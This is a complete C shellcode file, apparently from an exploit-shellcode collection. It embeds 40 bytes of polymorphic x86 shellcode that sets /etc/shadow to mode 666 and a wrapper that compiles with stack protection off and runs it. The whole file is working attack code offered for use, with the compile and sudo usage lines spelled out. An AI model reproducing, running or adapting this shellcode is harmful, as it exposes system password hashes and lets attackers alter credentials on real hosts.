/**
* Filename: chmod_etc_shadow_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Chmod 666 /etc/shadow on the local host
* Compilation: gcc -fno-stack-protector -z execstack -m32 chmod_etc_shadow_poly_shellcode.c -o chmod_etc_shadow_poly_final
* Usage: sudo ./chmod_etc_shadow_poly_final
* Shellcode size: 40 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x29\xdb\x6a\x17\x58\xcd\x80\x29\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
"\x68\x2f\x2f\x65\x74\x89\xe3\xb1\xb6\xb5\x01\x04\x0f\xcd\x80\x83\xc0\x01\xcd\x80";

int main()
{
        printf("Shellcode length: %d bytes\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
